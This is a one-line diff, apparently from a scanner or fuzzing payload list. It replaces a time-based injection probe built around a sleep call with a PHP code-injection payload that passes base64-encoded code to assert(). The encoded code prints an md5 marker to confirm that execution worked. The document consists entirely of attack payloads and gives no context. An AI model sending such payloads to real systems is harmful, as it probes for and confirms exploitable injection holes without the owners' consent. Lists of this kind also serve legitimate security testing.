@@ -1,1 +1,1 @@
-555'&&sleep(27*1000)*bdmcmt&&'
+;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
